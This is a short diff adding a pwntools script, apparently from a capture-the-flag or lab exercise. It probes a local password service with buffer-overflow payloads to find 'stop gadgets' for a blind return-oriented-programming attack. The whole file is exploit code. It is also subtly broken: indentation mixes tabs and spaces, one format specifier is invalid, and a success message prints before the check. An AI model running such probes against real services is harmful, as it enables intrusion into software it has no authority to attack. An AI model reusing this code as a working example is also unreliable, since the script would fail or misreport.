@@ -1,0 +1,23 @@
+from pwn import *
+def getStopGadgets(length):
+	addr = 0x400000
+	while 1:
+		try: 
+			sh = remote('127.0.0.1',9999)
+			payload = 'a'*length +p64(addr)
+			sh.recvuntil("password?\n")
+			sh.sendline(payload)
+			output = sh.recvuntil("password?\n")
+			sh.close()
+			print("one stop addr: 0x%x" % (addr))
+			if not output.startswith('WelCome'):
+				sh.close()
+				addr+=1
+                print("here %h is not a stop gadget"%hex(addr))
+			else:
+				return addr
+		except Exception:
+			addr+=1
+            print("%h is not a stop gadget"%hex(addr))
+			sh.close()
+stop_gadgets = getStopGadgets(72)
